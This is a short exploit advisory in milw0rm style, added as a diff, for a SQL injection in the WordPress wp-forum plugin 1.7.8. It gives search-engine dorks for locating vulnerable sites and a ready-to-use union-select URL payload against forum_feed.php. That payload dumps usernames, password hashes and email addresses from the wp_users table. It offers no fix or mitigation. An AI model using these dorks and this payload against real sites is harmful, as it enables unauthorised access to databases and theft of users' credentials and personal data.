@@ -1,0 +1,25 @@
+-----------------------------------------------------------------------------------------------
+# Wordpress Wp-forum plugin 1.7.8 Sql injection vulnerability #
+-----------------------------------------------------------------------------------------------
+Author: [[seomafia]]
+#########################
+
+Dorks:
+allinurl:page_id inurl:showforum
+inurl:plugins/wp-forum
+"index of /" wp-forum
+
+#######################
+
+Example :
+http://site.com/blog/wp-content/plugins/wp-forum/forum_feed.php?thread=[SQL]
+
+
+Exploit:
+http://site.com/blog/wp-content/plugins/wp-forum/forum_feed.php?thread=-99999+union+select+1,2,3,concat(user_login,0x2f,user_pass,0x2f,user_email),5,6,7+from+wp_users/*
+
+#######################
+
+Greetz: Exploit.In
+
+# milw0rm.com [2009-01-12]
